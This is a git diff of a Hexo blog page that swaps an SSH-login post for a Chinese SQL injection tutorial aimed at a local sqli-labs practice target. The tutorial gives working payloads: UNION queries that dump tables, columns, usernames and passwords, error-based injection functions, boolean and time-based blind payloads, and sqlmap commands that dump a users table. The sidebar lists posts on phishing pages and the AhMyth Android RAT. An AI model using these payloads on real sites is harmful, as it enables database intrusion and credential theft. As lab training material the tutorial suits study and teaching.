@@ -10,7 +10,7 @@
     
     
     
-    <title>ssh远程登陆Linux | hexo</title>
+    <title>SQL注入 | hexo</title>
     <link href="http://example.com" rel="prefetch" />
 
     
@@ -156,19 +156,19 @@
         <i class="fa fa-home"></i>
         <a href="http://example.com">hexo</a>
         >
-        <span>ssh远程登陆Linux</span>
+        <span>SQL注入</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
+                <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
             </h1>
         </div>
         <div class="tag-article">
             
             <span class="label label-gal">
-                <i class="fa fa-calendar"></i> 2023-12-06
+                <i class="fa fa-calendar"></i> 2023-12-20
             </span>
             
         </div>
@@ -178,11 +178,11 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
                 </h4>
             </div>
             <p>
-                <i class="fa fa-calendar"></i> 2023-12-06
+                <i class="fa fa-calendar"></i> 2023-12-20
             </p>
             <p>
                 
@@ -191,35 +191,166 @@
         </center>
     </div>
     <div class="content-article">
-        <ol>
-<li><p>打开Linux系统输入</p>
+        <h1 id="一、windows靶场搭建"><a href="#一、windows靶场搭建" class="headerlink" title="一、windows靶场搭建"></a>一、windows靶场搭建</h1><ol>
+<li><p>在phpstudy安装mqsql5.7.26,php安装5.5.9</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312240921616.png" alt="image-20231224092129794"></p>
+</li>
+<li><p>在网站–&gt;管理–&gt;php版本中更换至5.5.9版本</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312240923592.png" alt="image-20231224092342045"></p>
+</li>
+<li><p>将sqli文件夹放入WWW根目录下</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312240924231.png" alt="image-20231224092454112"></p>
+</li>
+<li><p>找到mysql5.7.26文件夹，bin目录下cmd进入,初始化数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入 mysql.exe -u root -p  （Windows可不输入.exe,默认自带）</span><br><span class="line">输入密码 root</span><br><span class="line">输入 use mysql</span><br><span class="line">输入 update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;</span><br><span class="line">输入 flush privileges</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312240928593.png" alt="image.png"></p>
+</li>
+<li><p>在phpstudy上开启apache、mysql服务，可通过本机的ip地址访问，进入靶场。</p>
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312240930418.png" alt="image-20231224093021702"></p>
+</li>
+</ol>
+<h1 id="二、sql的三种注释方式"><a href="#二、sql的三种注释方式" class="headerlink" title="二、sql的三种注释方式"></a>二、sql的三种注释方式</h1><ul>
+<li><p>单行注释</p>
+<ol>
+<li><code>--  </code>采用双减号进行单行注释，<strong>注意：</strong>双减号要用空格隔开才会生效</li>
+<li><code>#</code> 进行单行注释，不需要加空格就能生效</li>
+</ol>
+</li>
+<li><p>多行注释</p>
+<p><code>/*……*/</code> 进行多行注释，前一个至后一个的内容为注释</p>
+</li>
+</ul>
+<h1 id="三、UNION注入"><a href="#三、UNION注入" class="headerlink" title="三、UNION注入"></a>三、UNION注入</h1><ul>
+<li>使用<code>group_concat()</code>会将结果集中输出在一行</li>
+</ul>
+<ol>
+<li><p>查询数据库中的数据表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312202038683.png" alt="image-20231220203803460"></p>
+</li>
+<li><p>查询表中的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name),……   from information_schema.columns where table_name=&#x27;#要查询的表名#&#x27;</span><br><span class="line">and table_schema=database();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312202039750.png" alt="image-20231220203926755"></p>
+</li>
+<li><p>查询每一列的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(#列1#,&quot; &quot;,#列2#,……) from </span><br><span class="line">#要查询的表名#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312202040539.png" alt="image-20231220204049172"></p>
+</li>
+<li><p>在<code>mysql5.0</code>版本之后在数据库中新增了两个库information schema,performance schema。(考点)</p>
+</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li><p>确定数字型还是字符型</p>
 <ul>
-<li><p>systemctl enable sshd</p>
+<li><p>字符型需要判断闭合方式，数字型则不需要</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1  #有输出结果</span><br><span class="line">id=2  #有输出结果</span><br><span class="line">id=2-1 #有输出结果</span><br><span class="line">如果id=1 和 id=2-1的输出结果一样则是数字型，因为字符串中不会进行-运算</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>systemctl start sshd</p>
-</li>
-<li><p>vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
-</li>
-<li><p>按esc键，输入 :set nu（显示行号）</p>
-</li>
-<li><p>找到38行去掉#  在这行末尾没有yes需添加</p>
-<p>PermitRootLogin yes</p>
-</li>
-<li><p>systemctl restart sshd</p>
-</li>
-<li><p>ip add(查看ip)</p>
-<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312062111345.png" alt="image.png"></p>
+<li><p>输入<code>&#39;</code> 判断是否存在注入点，如果报错则存在注入点。</p>
 </li>
 </ul>
 </li>
-<li><p>在另外设备上按win+R，输入cmd打开命令行</p>
+<li><p>使用<code>order by/group by</code>的二分法判断union语句中前一个查询的列数</p>
+<p><code>?id=1 order by x --+ #不断更改x，直到有正常输出结果</code>确定有多数列数</p>
 </li>
-<li><p>在命令行输入ssh root@ip（如果报错，可能是防火墙原因，需关闭）</p>
+<li><p>优化语句，将<code>id</code>改为一个不存在的数字</p>
+<p><code>?id=0 or -x union select 1,2,3 #id=0是为了让回显只显示我们想要的结果 </code> 为了看哪一个有回显</p>
 </li>
-<li><p>输入Linux系统的密码登录</p>
-<p><img src="https://raw.githubusercontent.com/guangfa29/123/main/img/202312062111074.png" alt="image.png"></p>
+<li><p>使用<code>select</code>语句，查询靶机数据库库名</p>
+<p><code>?id=0 union select 1,database(),version() --+ #查看当前数据库和mysql版本号</code></p>
+</li>
+<li><p>使用<code>select</code>语句，查询靶机所有表名</p>
+<p><code>?id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
+<p>或者<code>?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3--+</code></p>
+</li>
+<li><p>使用<code>select</code>语句，查询靶机所有列名</p>
+<p><code>?id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p>
+</li>
+<li><p>查询所有用户名密码</p>
+<p><code>?id=0 union select 1,group_concat(username,password),2 from users --+</code></p>
 </li>
 </ol>
+<h1 id="四、报错注入"><a href="#四、报错注入" class="headerlink" title="四、报错注入"></a>四、报错注入</h1><ul>
+<li><strong>报错语句</strong></li>
+</ul>
+<ol>
+<li><code>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></li>
+<li><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></li>
+<li><code>(updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></li>
+<li><code>geometrycollection((select * from(select * from(select user())a)b))</code></li>
+<li><code>multipoint((select * from(select * from(select user())a)b))</code></li>
+<li><code>polygon((select * from(select * from(select user())a)b))</code></li>
+<li><code>multipolygon((select * from(select * from(select user())a)b))</code></li>
+<li><code>linestring((select * from(select * from(select user())a)b))</code></li>
+<li><code>multilinestring((select * from(select * from(select user())a)b))</code></li>
+<li><code>exp(~(select * from(select user())a))</code> 显示64个字符</li>
+</ol>
+<p>将其中的select user()或者user() 替换为 (查询语句)</p>
+<ul>
+<li><strong>报错注入使用的前提</strong></li>
+</ul>
+<ol>
+<li><p>后台对于输入输出的合理性没有做检查，就会存在报错注入的基础。</p>
+</li>
+<li><p>当页面有回显(报错信息)，才使用报错回显。</p>
+</li>
+</ol>
+<h1 id="五、布尔盲注"><a href="#五、布尔盲注" class="headerlink" title="五、布尔盲注"></a>五、布尔盲注</h1><ul>
+<li><p><strong>盲注</strong>：页面没有报错回显，不知道数据库具体返回值的情况下，对数据库中的内容进行猜解，实现SQL注入</p>
+</li>
+<li><p>盲注分类：布尔盲注，时间盲注，报错盲注</p>
+</li>
+<li><p>布尔盲注：web页面只返回True真，False假两种类型。利用页面返回不同，逐个进行猜解数据。</p>
+</li>
+<li><p>函数<code>ascii()</code>：把字母转换成ascii表中对应的数字</p>
+</li>
+<li><p>使用<code>ascii()</code>把查询到的内容转换成数字，以真假页面来判断字母和s对应的数字是否正确</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(&#x27;e&#x27;)=101 --+</span><br><span class="line">#条件满足，页面显示为真true</span><br><span class="line">?id=1&#x27; and ascii(&#x27;e&#x27;)=102 --+</span><br><span class="line">#条件不满足，页面显示为假false</span><br><span class="line">select ascii((select database())) #只能显示一个字符转换成的数字</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>函数<code>substr((),1,1)</code>：从第1个字符开始，显示1个字符</p>
+<p><code>select ascii(substr((select database()),1,1));</code></p>
+</li>
+<li><p>将<code>select database()</code>替换为想要查询的语句即可</p>
+<p><code>id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_name=database() limit 0,1)1,1))&gt;100 --+ #查询表名 </code></p>
+<p>此处没有必要使用<code>group_concat()</code>函数，而是使用<code>limit 0,1</code>，从第0行开始显示1行，从结果的第一行数据依次查询。</p>
+</li>
+<li><p>布尔盲注闭合符的判断</p>
+<p>当加入注释符和不加入注释符都为真时，则可以排除此次输入的闭合符，如</p>
+<p>排除双引号<code>&quot;</code>：</p>
+<p><code>?id=1&quot;  ---&gt;页面为真    and   ?id=1&quot;--+ ---&gt;页面为真</code></p>
+</li>
+</ul>
+<h1 id="六、时间盲注"><a href="#六、时间盲注" class="headerlink" title="六、时间盲注"></a>六、时间盲注</h1><ul>
+<li><p>时间盲注：web页面只返回一个正常页面，利用页面响应时间不同，组个猜解数据。前提是数据库会执行命令代码，只是不反馈页面信息。</p>
+</li>
+<li><p>函数<code>sleep()</code>：参数为休眠时长，以秒为单位，可以是小数。在使用函数<code>sleep()</code>并成功返回值后可在网络-耗时中查看响应时长。</p>
+<p><code>?id=1&#39; and sleep(3) --+</code></p>
+</li>
+<li><p>函数<code>if(condition,true,false) condition为条件，true当条件为真返回的值，false当条件为假返回的值</code></p>
+<p>例如，1&#x3D;1为真，执行休眠0秒：</p>
+<p><code>select if(1=1,sleep(0),sleep(3));</code></p>
+</li>
+<li><p>使用<code>if()</code>函数查询数据库</p>
+<p><code>id=1&#39; and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3));</code></p>
+<p>先执行查询当前数据库命令，再由<code>substr()</code>控制从第一个开始，一次输出一个，每输出一个字符，通过<code>ascii()</code>将字符转化成数字，然后将这个数字与100进行比较，由<code>if()</code>进行判断是否为真，返回值为<code>sleep()</code>函数。</p>
+</li>
+<li><p>将<code>select database()</code>替换为查询语句即可进行查询，获得想要的内容。</p>
+</li>
+<li><p>时间盲注闭合符判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and sleep(2)--+</span><br><span class="line">?id=1&#x27; and sleep(2)--+</span><br><span class="line">?id=1&#x27;) and sleep(2)--+</span><br><span class="line">?id=1&quot; and sleep(2)--+</span><br><span class="line">#一个个试，能成功进行两秒钟响应的就是它的闭合方式</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="七、sqlmap"><a href="#七、sqlmap" class="headerlink" title="七、sqlmap"></a>七、sqlmap</h1><p>打开虚拟机kali,进入命令行模式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. sqlmap --version 查看版本</span><br><span class="line">2. sqlmap -h  查看帮助</span><br><span class="line">3. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; 查询是否存在注入点</span><br><span class="line">4. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dbs 查看数据库</span><br><span class="line">5. --batch 默认选择</span><br><span class="line">6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --current-db 查看web当前使用的数据库</span><br><span class="line">6. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --tables -D &quot;security(指定数据库名)&quot; 查看指定数据库中的表名</span><br><span class="line">7. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --columns -T &quot;users(指定表名)&quot; -D &quot;security&quot; 查看数据库中的字段</span><br><span class="line">8. sqlmap -u &quot;192.168.2.76/sqli/Less-x/?id=x&quot; --dump -C &quot;id,username,password&quot; -T &quot;users&quot; -D &quot;security&quot; 查看指定的字段数据内容</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
 
     </div>
 </article>
@@ -357,7 +488,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
+                    <a href="/2023/12/03/daboke/">利用github搭博客</a>
                 </span>
             </li>
             
@@ -369,7 +500,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/04/AhMyth_use/">Ahmyth的使用</a>
+                    <a href="/2023/12/03/tuchuang/">图床搭建</a>
                 </span>
             </li>
             
@@ -426,17 +557,17 @@
 
                 
                 <li>
-                    <a href="/2023/12/06/ssh_denglu_Linux/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2023/12/06/ssh_denglu_Linux/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/2023/12/06/ssh_denglu_Linux/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2023/12/20/SQL_ZhuRu/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
